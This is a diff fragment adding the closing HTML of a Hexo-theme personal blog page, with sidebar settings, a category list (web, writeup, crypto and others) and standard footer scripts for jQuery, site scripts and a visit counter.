+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="web"><span class="iconfont-archer">&#xe60a;</span>web</span>
+    
+        <span class="sidebar-category-name" data-categories="writeup"><span class="iconfont-archer">&#xe60a;</span>writeup</span>
+    
+        <span class="sidebar-category-name" data-categories="study"><span class="iconfont-archer">&#xe60a;</span>study</span>
+    
+        <span class="sidebar-category-name" data-categories="misc"><span class="iconfont-archer">&#xe60a;</span>misc</span>
+    
+        <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
+    
+        <span class="sidebar-category-name" data-categories="other"><span class="iconfont-archer">&#xe60a;</span>other</span>
+    
+        <span class="sidebar-category-name" data-categories="cms"><span class="iconfont-archer">&#xe60a;</span>cms</span>
+    
+        <span class="sidebar-category-name" data-categories="Flow-Analysis"><span class="iconfont-archer">&#xe60a;</span>Flow-Analysis</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "一叶飘零"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
